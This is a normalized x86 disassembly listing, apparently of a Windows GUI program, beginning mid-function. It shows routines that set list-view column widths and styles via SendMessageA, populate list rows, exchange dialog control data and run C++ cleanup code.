call sub_4422d1
mov eax [ esp + 0xc ]
push 0x0
push eax
push 0xffffffff
lea ecx [ esp + 0x25c ]
call sub_42182c
test eax eax
jne r-xdata
mov edx [ esp + 0x24c ]
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x138 ]
push 0x1
push 0x1
lea ecx [ esp + 0x140 ]
call [ edx + 0x14 ]
mov eax [ esp + 0x200 ]
test eax eax
je r-xdata
mov eax [ esp + 0x318 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x250 ]
call sub_421900
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx ebp
call sub_43c126
mov ecx [ esi + 0x78 ]
push 0x50
push 0x0
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x64
push 0x2
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x4
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push eax
call edi
lea ecx [ esp + 0x364 ]
mov [ esp + 0x488 ] 0x6
call sub_442148
mov [ esp + 0x488 ] 0x5
lea ecx [ esp + 0x360 ]
call sub_442148
lea ecx [ esp + 0x250 ]
mov [ esp + 0x488 ] 0x3
call sub_421723
lea ecx [ esp + 0x24c ]
mov [ esp + 0x488 ] 0x8
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x488 ] 0x7
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x488 ] 0x2
call sub_421723
lea ecx [ esp + 0x47c ]
mov [ esp + 0x488 ] 0x9
call sub_442148
lea ecx [ esp + 0x368 ]
mov [ esp + 0x488 ] 0x1
call sub_421723
lea ecx [ esp + 0x134 ]
mov [ esp + 0x488 ] 0xf
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x488 ] 0xe
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x488 ] 0xd
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x488 ] 0xc
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x488 ] 0xb
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x488 ] 0xa
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x488 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x488 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x480 ]
pop edi
pop esi
mov eax 0x1
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x480
retn
mov ecx [ esp + 0x364 ]
mov edx [ esi + 0x12c ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x250 ]
push 0x1
push 0x1
lea ecx [ esp + 0x258 ]
call [ eax + 0x14 ]
mov eax [ esp + 0x318 ]
test eax eax
je r-xdata
sub_4180f0
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_460e88
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov esi ecx
push 0x1
call sub_440b18
mov eax [ esi + 0x188 ]
xor edi edi
cmp [ eax - 0x8 ] edi
jne r-xdata
mov ecx [ esi + 0x190 ]
cmp [ ecx - 0x8 ] edi
jne r-xdata
push edi
push edi
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
add esp 0x24
retn
mov edx [ esi + 0x194 ]
cmp [ edx - 0x8 ] edi
jne r-xdata
push edi
push edi
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
add esp 0x24
retn
mov eax [ esi + 0x18c ]
push edi
push edi
cmp [ eax - 0x8 ] edi
jne r-xdata
push edi
push edi
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
add esp 0x24
retn
mov ecx [ esi + 0x78 ]
mov ebx [ SendMessageA@IAT ]
push 0x1009
push ecx
call ebx
mov edx [ esi + 0x78 ]
push edi
push edi
push 0xb
push edx
call ebx
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
mov ecx [ esi + 0x18c ]
mov edx [ esi + 0x194 ]
mov eax [ esi + 0x190 ]
push ecx
mov ecx [ esi + 0x188 ]
push edx
push eax
push ecx
lea edx [ esp + 0x1c ]
push rw-data
push edx
mov [ esp + 0x44 ] edi
call sub_43b5cc
mov edx [ esp + 0x24 ]
mov eax [ esi + 0x198 ]
add esp 0x18
lea ecx [ esi + 0x198 ]
push edi
push edx
push 0xffffffff
call [ eax + 0xc ]
test eax eax
jne r-xdata
push rw-data
call sub_4496b7
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x18 ]
mov [ fs : 0x0 ] ecx
add esp 0x24
retn
cmp [ esi + 0x260 ] edi
jne r-xdata
push edi
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
jmp r-xdata
mov eax [ esi + 0x198 ]
lea ecx [ esi + 0x198 ]
call [ eax + 0x10 ]
mov ecx [ esi + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call ebx
push ebp
lea ebx [ esi + 0x5c ]
lea ecx [ esp + 0xc ]
mov [ esp + 0x2c ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x24 ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x24
retn
mov eax [ esi + 0x2b4 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push edi
push 0x1
mov ecx ebx
call sub_43c179
mov eax [ esi + 0x2b8 ]
mov ecx ebx
push eax
push 0x1
push edi
call sub_43c1c5
mov eax [ esi + 0x2ac ]
mov ecx ebx
push eax
push 0x2
push edi
call sub_43c1c5
mov ecx [ esi + 0x2c4 ]
lea eax [ esp + 0x14 ]
push 0xa
push eax
push ecx
call sub_42d656
add esp 0xc
lea edx [ esp + 0x14 ]
mov ecx ebx
push edx
push 0x3
push edi
call sub_43c1c5
lea eax [ esp + 0x14 ]
lea ebp [ edi + 0x1 ]
push 0xa
push eax
push ebp
call sub_42d5cd
add esp 0xc
lea ecx [ esp + 0x14 ]
push ecx
push 0x4
push edi
mov ecx ebx
call sub_43c1c5
mov edx [ esi + 0x198 ]
lea ecx [ esi + 0x198 ]
push 0x1
push 0x1
mov edi ebp
call [ edx + 0x14 ]
mov eax [ esi + 0x260 ]
test eax eax
je r-xdata
mov ebx [ SendMessageA@IAT ]
pop ebp
sub_418340
push 0xffffffff
push sub_460f07
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push esi
push edi
mov esi ecx
push eax
push 0x95
mov [ esp + 0x14 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x18 ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x18 ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x18 ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x18 ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov edx [ rw-data ]
lea ecx [ esi + 0x14c ]
mov [ ecx ] edx
mov eax [ rw-data ]
lea edi [ esi + 0x150 ]
mov [ edi ] eax
mov edx [ rw-data ]
lea ebx [ esi + 0x154 ]
mov [ ebx ] edx
push rw-data
mov [ esp + 0x1c ] 0x7
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx edi
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
mov ecx [ esp + 0x10 ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_418470
push 0xffffffff
push sub_460faf
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x35c
push ebp
push esi
push edi
mov esi ecx
call sub_43e113
mov eax [ rw-data ]
mov [ esp + 0xc ] eax
push 0x0
lea ecx [ esp + 0x14 ]
mov [ esp + 0x374 ] 0x0
call sub_40a470
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x374 ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd8 ]
mov edi [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x10 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x254 ]
call sub_40c9c0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x374 ] 0x2
call sub_4422d1
mov eax [ esp + 0xc ]
push 0x0
push eax
push 0xffffffff
lea ecx [ esp + 0x25c ]
call sub_42182c
test eax eax
jne r-xdata
mov edx [ esp + 0x120 ]
mov eax [ esi + 0x12c ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
mov eax [ esp + 0x318 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x250 ]
call sub_421900
push 0x0
lea ecx [ esp + 0x13c ]
call sub_40d5c0
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x374 ] 0x3
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x144 ]
call sub_42182c
test eax eax
jne r-xdata
mov ecx [ esp + 0x364 ]
mov edx [ esi + 0xf0 ]
push ecx
push 0x0
push 0x143
push edx
call edi
mov eax [ esp + 0x250 ]
push 0x1
push 0x1
lea ecx [ esp + 0x258 ]
call [ eax + 0x14 ]
mov eax [ esp + 0x318 ]
test eax eax
je r-xdata
mov eax [ esp + 0x200 ]
test eax eax
jne r-xdata
push eax
push eax
push rw-data
call sub_4496b7
lea ecx [ esp + 0x138 ]
call sub_421900
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx ebp
call sub_43c126
mov eax [ esi + 0x78 ]
push 0x50
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x50
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x4
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x5
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push eax
call edi
lea ecx [ esp + 0x24c ]
mov [ esp + 0x370 ] 0x5
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x370 ] 0x4
call sub_442148
lea ecx [ esp + 0x138 ]
mov [ esp + 0x370 ] 0x2
call sub_421723
lea ecx [ esp + 0x364 ]
mov [ esp + 0x370 ] 0x6
call sub_442148
lea ecx [ esp + 0x250 ]
mov [ esp + 0x370 ] 0x1
call sub_421723
lea ecx [ esp + 0x134 ]
mov [ esp + 0x370 ] 0xc
call sub_442148
lea ecx [ esp + 0x130 ]
mov [ esp + 0x370 ] 0xb
call sub_442148
lea ecx [ esp + 0x12c ]
mov [ esp + 0x370 ] 0xa
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x370 ] 0x9
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x370 ] 0x8
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x370 ] 0x7
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x370 ] 0x0
call sub_421723
lea ecx [ esp + 0xc ]
mov [ esp + 0x370 ] 0xffffffff
call sub_442148
mov ecx [ esp + 0x368 ]
pop edi
pop esi
mov eax 0x1
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x368
retn
mov edx [ esp + 0x24c ]
mov eax [ esi + 0xb4 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x138 ]
push 0x1
push 0x1
lea ecx [ esp + 0x140 ]
call [ edx + 0x14 ]
mov eax [ esp + 0x200 ]
test eax eax
je r-xdata
sub_418870
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_461002
push eax
mov [ fs : 0x0 ] esp
sub esp 0x2a0
push ebx
push ebp
push esi
push edi
mov ebp ecx
push 0x1
call sub_440b18
mov eax [ ebp + 0x14c ]
xor esi esi
cmp [ eax - 0x8 ] esi
jne r-xdata
mov ecx [ ebp + 0x150 ]
cmp [ ecx - 0x8 ] esi
jne r-xdata
push esi
push esi
push rw-data
call sub_4496b7
jmp r-xdata
mov edx [ ebp + 0x154 ]
push esi
push esi
cmp [ edx - 0x8 ] esi
jne r-xdata
push esi
push esi
push rw-data
call sub_4496b7
jmp r-xdata
mov ecx [ esp + 0x2b0 ]
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x2ac
retn
mov eax [ ebp + 0x78 ]
mov edi [ SendMessageA@IAT ]
push 0x1009
push eax
call edi
mov ecx [ ebp + 0x78 ]
push esi
push esi
push 0xb
push ecx
call edi
mov edx [ rw-data ]
mov [ esp + 0x18 ] edx
push rw-data
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2bc ] esi
call sub_4421b6
mov eax [ rw-data ]
mov [ esp + 0x14 ] eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x2b8 ] 0x2
call sub_420d1c
push 0x1
push rw-data
push esi
push esi
push rw-data
lea ecx [ esp + 0x44 ]
mov [ esp + 0x2cc ] 0x3
call sub_420de1
lea ecx [ esp + 0x30 ]
push ecx
lea ecx [ esp + 0x94 ]
call sub_421517
lea edx [ esp + 0x30 ]
lea ecx [ esp + 0x1a0 ]
push edx
mov [ esp + 0x2bc ] 0x4
call sub_421517
mov eax [ ebp + 0x154 ]
mov ecx [ ebp + 0x150 ]
mov edx [ ebp + 0x14c ]
push eax
push ecx
push edx
lea eax [ esp + 0x24 ]
push rw-data
push eax
mov [ esp + 0x2cc ] 0x5
call sub_43b5cc
mov ecx [ esp + 0x2c ]
add esp 0x14
push esi
push ecx
push 0x2
lea ecx [ esp + 0x9c ]
call sub_42182c
test eax eax
jne r-xdata
push rw-data
call sub_4496b7
jmp r-xdata
push rw-data
lea ecx [ esp + 0xa4 ]
call sub_4422d1
cmp [ esp + 0x158 ] esi
jne r-xdata
push esi
push rw-data
push rw-data
mov ecx ebp
call sub_43fe9c
jmp r-xdata
lea ecx [ esp + 0x90 ]
call sub_421900
mov ecx [ ebp + 0x78 ]
push 0x0
push 0x1
push 0xb
push ecx
call edi
lea edi [ ebp + 0x5c ]
lea ecx [ esp + 0x1a0 ]
mov [ esp + 0x2b8 ] 0x4
call sub_421723
lea ecx [ esp + 0x90 ]
mov [ esp + 0x2b8 ] 0x3
call sub_421723
lea ecx [ esp + 0x30 ]
mov [ esp + 0x2b8 ] 0x2
call sub_420d99
lea ecx [ esp + 0x14 ]
mov [ esp + 0x2b8 ] 0x1
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x2b8 ] 0x0
call sub_442148
lea ecx [ esp + 0x18 ]
mov [ esp + 0x2b8 ] 0xffffffff
call sub_442148
push 0x0
push rw-data
push rw-data
mov ecx ebp
call sub_43fe9c
lea ecx [ esp + 0x90 ]
call sub_421900
jmp r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
lea ecx [ esp + 0x1a8 ]
call sub_422003
lea ecx [ esp + 0x1a0 ]
call sub_421900
mov edx [ esp + 0x10 ]
mov ecx edi
push edx
push 0x1
push esi
call sub_43c1c5
mov eax [ ebp + 0x14c ]
mov ecx edi
push eax
push 0x2
push esi
call sub_43c1c5
lea eax [ esp + 0x10 ]
lea ecx [ esp + 0x90 ]
push eax
push rw-data
call sub_422003
mov ecx [ esp + 0x10 ]
push ecx
push 0x3
push esi
mov ecx edi
call sub_43c1c5
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x90 ]
push edx
push rw-data
call sub_422003
mov eax [ esp + 0x10 ]
mov ecx edi
push eax
push 0x4
push esi
call sub_43c1c5
lea ecx [ esp + 0x1c ]
lea ebx [ esi + 0x1 ]
push 0xa
push ecx
push ebx
call sub_42d5cd
add esp 0xc
lea edx [ esp + 0x1c ]
mov ecx edi
push edx
push 0x5
push esi
call sub_43c1c5
mov eax [ esp + 0x90 ]
push 0x1
push 0x1
lea ecx [ esp + 0x98 ]
mov esi ebx
call [ eax + 0x14 ]
mov eax [ esp + 0x158 ]
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
lea ecx [ esp + 0x90 ]
push edx
push rw-data
call sub_422003
mov eax [ esp + 0x10 ]
push 0x0
push 0x0
push 0x0
push 0x0
push eax
push esi
push 0x1
mov ecx edi
call sub_43c179
mov ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
push ecx
push rw-data
push edx
call sub_43b5cc
mov eax [ esp + 0x20 ]
add esp 0xc
lea ecx [ esp + 0x1a0 ]
push 0x0
push eax
push 0x2
call sub_42182c
test eax eax
je r-xdata
mov edi [ SendMessageA@IAT ]
sub_418c10
push 0xffffffff
push sub_461085
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
push ecx
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
push edi
mov esi ecx
push eax
push 0x88
mov [ esp + 0x18 ] esi
call sub_43ddd5
lea edi [ esi + 0x5c ]
mov [ esp + 0x1c ] 0x0
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x98 ]
mov [ esp + 0x1c ] 0x1
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0xd4 ]
mov [ esp + 0x1c ] 0x2
mov ecx edi
call sub_43e388
mov [ edi ] r--data
lea edi [ esi + 0x110 ]
mov [ esp + 0x1c ] 0x3
mov ecx edi
call sub_43e388
mov [ edi ] r--data
mov ecx [ rw-data ]
lea edi [ esi + 0x14c ]
mov [ edi ] ecx
mov edx [ rw-data ]
lea ebx [ esi + 0x150 ]
mov [ ebx ] edx
mov eax [ rw-data ]
lea ebp [ esi + 0x154 ]
mov [ ebp ] eax
push 0x0
lea ecx [ esi + 0x158 ]
mov [ esp + 0x20 ] 0x7
call sub_41e710
push rw-data
mov ecx edi
mov [ esp + 0x20 ] 0x8
mov [ esi ] r--data
call sub_4422d1
push rw-data
mov ecx ebx
call sub_4422d1
push rw-data
mov ecx ebp
call sub_4422d1
mov ecx [ esp + 0x14 ]
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
mov [ fs : 0x0 ] ecx
add esp 0x10
retn 0x4
sub_418d50
push esi
mov esi ecx
push edi
mov edi [ esp + 0xc ]
lea eax [ esi + 0x5c ]
push eax
push 0x3e9
push edi
call sub_449556
lea ecx [ esi + 0x98 ]
push ecx
push 0x3f1
push edi
call sub_449556
lea edx [ esi + 0xd4 ]
push edx
push 0x3f0
push edi
call sub_449556
lea eax [ esi + 0x110 ]
push eax
push 0x3f6
push edi
call sub_449556
lea ecx [ esi + 0x14c ]
push ecx
push 0x3f6
push edi
call sub_449495
lea edx [ esi + 0x150 ]
push edx
push 0x3f0
push edi
call sub_449495
add esi 0x154
push esi
push 0x3f1
push edi
call sub_449495
pop edi
pop esi
retn 0x4
sub_418df0
push 0xffffffff
push sub_4610c1
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x120
push ebp
push esi
push edi
mov esi ecx
call sub_43e113
push 0x0
lea ecx [ esp + 0x14 ]
call sub_40b290
mov eax [ rw-data ]
mov [ esp + 0x134 ] 0x0
mov [ esp + 0xc ] eax
push rw-data
lea ecx [ esp + 0x10 ]
mov [ esp + 0x138 ] 0x1
call sub_4422d1
mov ecx [ esp + 0xc ]
push 0x0
push ecx
push 0xffffffff
lea ecx [ esp + 0x1c ]
call sub_42182c
test eax eax
jne r-xdata
mov eax [ esp + 0xd8 ]
mov edi [ SendMessageA@IAT ]
test eax eax
jne r-xdata
push eax
push rw-data
push rw-data
mov ecx esi
call sub_43fe9c
lea ecx [ esp + 0x10 ]
call sub_421900
push 0xffffffff
push 0xffffffff
lea ebp [ esi + 0x5c ]
push 0x0
push rw-data
push 0x0
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x1
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x2
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x3
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x4
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x5
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x6
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x7
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x8
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x9
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0xa
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0xb
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0xc
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0xd
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0xe
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0xf
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x10
mov ecx ebp
call sub_43c126
push 0xffffffff
push 0xffffffff
push 0x0
push rw-data
push 0x11
mov ecx ebp
call sub_43c126
mov eax [ esi + 0x78 ]
push 0x3c
push 0x0
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x50
push 0x1
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x50
push 0x2
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x3c
push 0x3
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x3c
push 0x4
push 0x101e
push ecx
call edi
push 0x3c
push 0x5
push 0x101e
mov edx [ esi + 0x78 ]
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x64
push 0x6
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x3c
push 0x7
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x64
push 0x8
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x64
push 0x9
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x64
push 0xa
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x64
push 0xb
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x64
push 0xc
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x64
push 0xd
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x64
push 0xe
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x64
push 0xf
push 0x101e
push eax
call edi
mov ecx [ esi + 0x78 ]
push 0x64
push 0x10
push 0x101e
push ecx
call edi
mov edx [ esi + 0x78 ]
push 0x64
push 0x11
push 0x101e
push edx
call edi
mov eax [ esi + 0x78 ]
push 0x21
push 0x0
push 0x1036
push eax
call edi
lea ecx [ esp + 0xc ]
mov [ esp + 0x134 ] 0x0
call sub_442148
lea ecx [ esp + 0x128 ]
mov [ esp + 0x134 ] 0x4
call sub_442148
lea ecx [ esp + 0x124 ]
mov [ esp + 0x134 ] 0x3
call sub_442148
lea ecx [ esp + 0x120 ]
mov [ esp + 0x134 ] 0x2
call sub_442148
lea ecx [ esp + 0x10 ]
mov [ esp + 0x134 ] 0xffffffff
call sub_421723
mov ecx [ esp + 0x12c ]
pop edi
pop esi
mov eax 0x1
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x12c
retn
mov edx [ esp + 0x124 ]
mov eax [ esi + 0xf0 ]
push edx
push 0x0
push 0x143
push eax
call edi
mov edx [ esp + 0x10 ]
push 0x1
push 0x1
lea ecx [ esp + 0x18 ]
call [ edx + 0x14 ]
mov eax [ esp + 0xd8 ]
test eax eax
je r-xdata
sub_4191e0
push 0xffffffff
push sub_4615f6
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x25c
push ebp
push esi
mov esi ecx
push edi
push 0x0
lea ecx [ esp + 0x14 ]
call sub_41c380
lea ecx [ esp + 0x10 ]
mov [ esp + 0x270 ] 0x0
call sub_43de8a
cmp eax 0x1
jne r-xdata
lea ecx [ esp + 0x25c ]
mov [ esp + 0x270 ] 0x85
call sub_442148
lea ecx [ esp + 0x258 ]
mov [ esp + 0x270 ] 0x84
call sub_442148
lea ecx [ esp + 0x254 ]
mov [ esp + 0x270 ] 0x83
call sub_442148
lea ecx [ esp + 0x250 ]
mov [ esp + 0x270 ] 0x82
call sub_442148
lea ecx [ esp + 0x24c ]
mov [ esp + 0x270 ] 0x81
call sub_442148
lea ecx [ esp + 0x248 ]
mov [ esp + 0x270 ] 0x80
call sub_442148
lea ecx [ esp + 0x244 ]
mov [ esp + 0x270 ] 0x7f
call sub_442148
lea ecx [ esp + 0x240 ]
mov [ esp + 0x270 ] 0x7e
call sub_442148
lea ecx [ esp + 0x23c ]
mov [ esp + 0x270 ] 0x7d
call sub_442148
lea ecx [ esp + 0x238 ]
mov [ esp + 0x270 ] 0x7c
call sub_442148
lea ecx [ esp + 0x234 ]
mov [ esp + 0x270 ] 0x7b
call sub_442148
lea ecx [ esp + 0x230 ]
mov [ esp + 0x270 ] 0x7a
call sub_442148
lea ecx [ esp + 0x22c ]
mov [ esp + 0x270 ] 0x79
call sub_442148
lea ecx [ esp + 0x228 ]
mov [ esp + 0x270 ] 0x78
call sub_442148
lea ecx [ esp + 0x224 ]
mov [ esp + 0x270 ] 0x77
call sub_442148
lea ecx [ esp + 0x220 ]
mov [ esp + 0x270 ] 0x76
call sub_442148
lea ecx [ esp + 0x21c ]
mov [ esp + 0x270 ] 0x75
call sub_442148
lea ecx [ esp + 0x218 ]
mov [ esp + 0x270 ] 0x74
call sub_442148
lea ecx [ esp + 0x214 ]
mov [ esp + 0x270 ] 0x73
call sub_442148
lea ecx [ esp + 0x210 ]
mov [ esp + 0x270 ] 0x72
call sub_442148
lea ecx [ esp + 0x20c ]
mov [ esp + 0x270 ] 0x71
call sub_442148
lea ecx [ esp + 0x208 ]
mov [ esp + 0x270 ] 0x70
call sub_442148
lea ecx [ esp + 0x204 ]
mov [ esp + 0x270 ] 0x6f
call sub_442148
lea ecx [ esp + 0x200 ]
mov [ esp + 0x270 ] 0x6e
call sub_442148
lea ecx [ esp + 0x1fc ]
mov [ esp + 0x270 ] 0x6d
call sub_442148
lea ecx [ esp + 0x1f8 ]
mov [ esp + 0x270 ] 0x6c
call sub_442148
lea ecx [ esp + 0x1f4 ]
mov [ esp + 0x270 ] 0x6b
call sub_442148
lea ecx [ esp + 0x1f0 ]
mov [ esp + 0x270 ] 0x6a
call sub_442148
lea ecx [ esp + 0x1ec ]
mov [ esp + 0x270 ] 0x69
call sub_442148
lea ecx [ esp + 0x1e8 ]
mov [ esp + 0x270 ] 0x68
call sub_442148
lea ecx [ esp + 0x1e4 ]
mov [ esp + 0x270 ] 0x67
call sub_442148
lea ecx [ esp + 0x1e0 ]
mov [ esp + 0x270 ] 0x66
call sub_442148
lea ecx [ esp + 0x1dc ]
mov [ esp + 0x270 ] 0x65
call sub_442148
lea ecx [ esp + 0x1d8 ]
mov [ esp + 0x270 ] 0x64
call sub_442148
lea ecx [ esp + 0x1d4 ]
